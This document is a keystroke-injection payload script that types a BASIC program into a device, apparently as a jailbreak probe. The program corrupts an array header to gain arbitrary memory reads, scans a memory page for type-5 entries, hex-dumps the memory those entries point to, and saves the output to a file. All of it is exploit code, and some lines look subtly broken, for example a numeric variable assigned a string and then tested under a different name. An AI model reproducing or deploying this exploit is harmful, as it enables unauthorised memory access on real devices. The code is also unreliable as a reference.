REM ns2jb S32 self-contained type5 deref -- compact TapDucky payload
DEFAULTDELAY 40
DELAY 2500
STRINGLN VAR NSR,V$,D$,S$,A$,X$,OD$,ZERO$,CAP$,I,J
STRINGLN VAR PHASE=0,E0#
STRINGLN ZERO$=CHR$(0)
STRINGLN FOR I=1 TO 18:ZERO$=ZERO$+ZERO$:NEXT
STRINGLN NSR=ARRAY$(4)
STRINGLN COPY NSR[0],0,"0000":COPY NSR[1],0,"1111"
STRINGLN COPY NSR[2],0,"2222":COPY NSR[3],0,"3333"
STRINGLN PRINT "DIST MIN READY",4461
STRINGLN END
STRINGLN COMMON DEF P$(V#)
STRINGLN VAR S$="",J
STRINGLN FOR J=0 TO 3
STRINGLN S$=S$+CHR$(V#-FLOOR(V#/65536)*65536):V#=FLOOR(V#/65536)
STRINGLN NEXT
STRINGLN RETURN S$
STRINGLN END
STRINGLN COMMON DEF U#(S$)
STRINGLN VAR V#=0,J
STRINGLN IF LEN(S$)<4 THEN RETURN 0
STRINGLN FOR J=3 TO 0 STEP -1:V#=V#*65536+ASC(MID$(S$,J,1)):NEXT
STRINGLN RETURN V#
STRINGLN END
STRINGLN COMMON DEF HASH#(S$)
STRINGLN VAR V#=0,J
STRINGLN FOR J=0 TO LEN(S$)-1
STRINGLN V#=V#*65599+ASC(MID$(S$,J,1))
STRINGLN V#=V#-FLOOR(V#/2147483647)*2147483647
STRINGLN NEXT
STRINGLN RETURN V#
STRINGLN END
STRINGLN COMMON DEF HX$(V#)
STRINGLN VAR S$="",J,A
STRINGLN FOR J=0 TO 11
STRINGLN A=V#-FLOOR(V#/16)*16
STRINGLN S$=MID$("0123456789ABCDEF",A,1)+S$
STRINGLN V#=FLOOR(V#/16)
STRINGLN NEXT
STRINGLN RETURN S$
STRINGLN END
STRINGLN COMMON DEF PLOG(S$)
STRINGLN CAP$=CAP$+S$+CHR$(10)
STRINGLN PRINT S$
STRINGLN IF LEN(CAP$)>900 THEN CAP$=MID$(CAP$,LEN(CAP$)-800)
STRINGLN RETURN ""
STRINGLN END
STRINGLN COMMON DEF AIM(A#,N)
STRINGLN COPY NSR[0],16,P$(A#)+P$(N)
STRINGLN RETURN ""
STRINGLN END
STRINGLN COMMON DEF UNAIM()
STRINGLN IF OD$!="" THEN COPY NSR[0],16,OD$
STRINGLN RETURN ""
STRINGLN END
STRINGLN COMMON DEF RD(A#,N)
STRINGLN VAR S$
STRINGLN X$=AIM(A#,N)
STRINGLN IF LEN(NSR[1])!=N THEN RETURN ""
STRINGLN S$=COPY(NSR[1],0,N)
STRINGLN X$=UNAIM()
STRINGLN RETURN S$
STRINGLN END
STRINGLN COMMON DEF S1()
STRINGLN VAR V#
STRINGLN V$=COPY(NSR[0],0,16)
STRINGLN E0#=U#(LEFT$(V$,4))
STRINGLN OD$=COPY(NSR[0],16,8)
STRINGLN X$=PLOG("W0 "+HX$(E0#))
STRINGLN RETURN 1
STRINGLN END
STRINGLN COMMON DEF DUMPH$(S$)
STRINGLN VAR Q$,J
STRINGLN Q$=""
STRINGLN FOR J=0 TO LEN(S$)-1
STRINGLN Q$=Q$+HEX$(ASC(MID$(S$,J,1)),4)
STRINGLN NEXT
STRINGLN RETURN Q$
STRINGLN END
STRINGLN COMMON DEF S32DEREF()
STRINGLN VAR V#,L#,J,N,PG#,H#,K#,X2#
STRINGLN K#=U#(RD(E0#+8,8))
STRINGLN IF K#<4096 THEN X$=PLOG("KH BAD"):IF CAP$!="" THEN SAVEV "TXT:PROBEOUT",CAP$:RETURN 0
STRINGLN PG#=FLOOR(K#/4096)*4096
STRINGLN D$=RD(PG#,2048)
STRINGLN IF LEN(D$)<2048 THEN X$=PLOG("SHORT"):IF CAP$!="" THEN SAVEV "TXT:PROBEOUT",CAP$:RETURN 0
STRINGLN N=0
STRINGLN FOR J=0 TO 2036 STEP 8
STRINGLN V#=U#(MID$(D$,J,4))
STRINGLN L#=U#(MID$(D$,J+4,4))
STRINGLN IF L#==5 THEN
STRINGLN N=N+1
STRINGLN X$=PLOG("T5 @ "+HX$(PG#+J*2)+" V "+HX$(V#)+" L "+HX$(L#))
STRINGLN IF N<=3 THEN
STRINGLN X2#=RD(V#,64)
STRINGLN IF LEN(X2$)>=64 THEN X$=PLOG("  AT "+HX$(V#)+" "+DUMPH$(LEFT$(X2$,64)))
STRINGLN ENDIF
STRINGLN ENDIF
STRINGLN NEXT
STRINGLN X$=PLOG("T5COUNT "+STR$(N))
STRINGLN IF CAP$!="" THEN SAVEV "TXT:PROBEOUT",CAP$
STRINGLN RETURN 1
STRINGLN END
